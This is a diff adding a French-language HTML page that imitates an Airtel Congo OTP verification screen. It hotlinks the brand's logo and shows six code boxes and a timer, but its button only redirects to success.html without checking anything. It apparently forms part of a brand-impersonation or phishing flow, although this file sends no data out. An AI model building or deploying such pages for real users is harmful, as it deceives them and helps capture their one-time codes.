@@ -1,0 +1,160 @@
+<!doctype html>
+<html lang="fr">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>AIRTEL CONGO — Vérification OTP</title>
+    <style>
+      *, *::before, *::after { box-sizing: border-box; }
+      html, body {
+        margin: 0; padding: 0; min-height: 100%;
+        font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+        background: #f4f5f7; color: #1a1a1a; -webkit-font-smoothing: antialiased;
+      }
+      #root { min-height: 100vh; display: flex; }
+      .login-container {
+        display: flex; flex-direction: column; width: 100%; min-height: 100vh;
+        max-width: 480px; margin: 0 auto; background: #ffffff;
+      }
+      .login-header { padding: 1.5rem 1.5rem 0.5rem; display: flex; justify-content: center; }
+      .logo-large img { height: 44px; width: auto; display: block; }
+      .login-content { flex: 1; padding: 1rem 1.5rem 2rem; display: flex; flex-direction: column; }
+      .otp-title { font-size: 1.25rem; font-weight: 700; line-height: 1.35; color: #111; margin: 0 0 0.5rem; }
+      .otp-sub { font-size: 0.9rem; color: #666; margin: 0 0 1.75rem; line-height: 1.55; }
+      .otp-sub strong { color: #111; font-family: ui-monospace, monospace; }
+      .otp-inputs-wrapper {
+        display: flex; justify-content: center; gap: 0.55rem; margin-bottom: 1.5rem;
+      }
+      .otp-box {
+        width: 48px; height: 56px; text-align: center; font-size: 1.5rem; font-weight: 700;
+        border: 1px solid #d8dbe0; border-radius: 12px; background: #fff; color: #111;
+        outline: none; padding: 0; line-height: 1;
+        transition: border-color 0.2s ease, box-shadow 0.2s ease, transform 0.1s ease;
+      }
+      .otp-box:focus { border-color: #e40000; box-shadow: 0 0 0 3px rgba(228,0,0,0.12); transform: translateY(-1px); }
+      .otp-box.filled { border-color: #e40000; background: #fff5f5; }
+      .otp-timer { text-align: center; font-size: 0.85rem; color: #666; margin-bottom: 1.25rem; }
+      .otp-timer strong { color: #e40000; font-variant-numeric: tabular-nums; }
+      .otp-resend {
+        background: none; border: none; color: #e40000; font-weight: 600;
+        font-size: 0.85rem; cursor: pointer; padding: 0; margin-left: 0.25rem;
+      }
+      .otp-resend:hover { text-decoration: underline; }
+      .otp-verify-btn {
+        padding: 1rem; border: none; border-radius: 12px;
+        background: #e40000; color: #fff; font-size: 0.95rem; font-weight: 800;
+        letter-spacing: 0.04em; cursor: pointer;
+        transition: background 0.2s ease, transform 0.15s ease, opacity 0.2s ease;
+      }
+      .otp-verify-btn:hover { background: #ff1a1a; transform: translateY(-1px); }
+      .otp-verify-btn:disabled { opacity: 0.45; cursor: not-allowed; transform: none; }
+      .login-footer {
+        padding: 1.5rem; display: flex; flex-direction: column; align-items: center;
+        gap: 0.75rem; border-top: 1px solid #eceef1;
+      }
+      .login-footer img { height: 26px; width: auto; opacity: 0.7; }
+      .footer { font-size: 0.75rem; color: #8a8f98; text-align: center; }
+      @media (max-width: 400px) {
+        .otp-box { width: 42px; height: 50px; font-size: 1.25rem; border-radius: 10px; }
+        .otp-inputs-wrapper { gap: 0.4rem; }
+      }
+    </style>
+  </head>
+  <body>
+    <div id="root">
+      <div class="login-container">
+        <div class="login-header">
+          <div class="logo-large">
+            <img alt="Airtel Logo" src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg">
+          </div>
+        </div>
+        <div class="login-content">
+          <h1 class="otp-title">Vérification OTP</h1>
+          <p class="otp-sub">Un code à 6 chiffres a été envoyé au <strong id="phoneDisplay">+243 —</strong>. Entrez-le ci-dessous pour confirmer votre identité.</p>
+
+          <div class="otp-inputs-wrapper">
+            <input class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]" type="text" value="">
+            <input class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]" type="text" value="">
+            <input class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]" type="text" value="">
+            <input class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]" type="text" value="">
+            <input class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]" type="text" value="">
+            <input class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]" type="text" value="">
+          </div>
+
+          <div class="otp-timer">
+            Code valable pendant <strong id="timer">02:00</strong>
+            <button class="otp-resend" type="button" disabled>Renvoyer</button>
+          </div>
+
+          <button id="verifyOtpBtn" class="otp-verify-btn" type="button" disabled>VÉRIFIER LE CODE</button>
+        </div>
+        <div class="login-footer">
+          <div>
+            <img alt="Airtel Logo" src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg">
+          </div>
+          <footer class="footer">© 2026 Airtel Congo. Tous droits réservés.</footer>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      /* Read phone from URL hash and show it */
+      (function () {
+        var hash = window.location.hash || '';
+        var m = hash.match(/phone=([^&]+)/);
+        if (m) {
+          var digits = decodeURIComponent(m[1]).replace(/\D/g, '');
+          var formatted = digits.replace(/(\d{2})(\d{3})(\d{4})/, '+243 $1 $2 $3');
+          document.getElementById('phoneDisplay').textContent = formatted || ('+243 ' + digits);
+        }
+      })();
+
+      /* OTP box UX */
+      (function () {
+        var boxes = document.querySelectorAll('.otp-box');
+        var verifyBtn = document.getElementById('verifyOtpBtn');
+
+        function updateButton() {
+          var filled = Array.prototype.every.call(boxes, function (b) { return b.value.length === 1; });
+          verifyBtn.disabled = !filled;
+        }
+
+        boxes.forEach(function (box, i) {
+          box.addEventListener('input', function () {
+            box.value = box.value.replace(/\D/g, '').slice(0, 1);
+            box.classList.toggle('filled', box.value.length === 1);
+            if (box.value && i < boxes.length - 1) boxes[i + 1].focus();
+            updateButton();
+          });
+          box.addEventListener('keydown', function (e) {
+            if (e.key === 'Backspace' && !box.value && i > 0) {
+              boxes[i - 1].focus();
+              boxes[i - 1].value = '';
+              boxes[i - 1].classList.remove('filled');
+              updateButton();
+            }
+          });
+        });
+      })();
+
+      /* Countdown timer */
+      (function () {
+        var total = 120;
+        var timerEl = document.getElementById('timer');
+        var interval = setInterval(function () {
+          if (total <= 0) { clearInterval(interval); timerEl.textContent = '00:00'; return; }
+          total--;
+          var m = String(Math.floor(total / 60)).padStart(2, '0');
+          var s = String(total % 60).padStart(2, '0');
+          timerEl.textContent = m + ':' + s;
+        }, 1000);
+      })();
+
+      /* → success.html */
+      document.getElementById('verifyOtpBtn').addEventListener('click', function () {
+        var hash = window.location.hash || '';
+        window.location.href = 'success.html' + hash;
+      });
+    </script>
+  </body>
+</html>
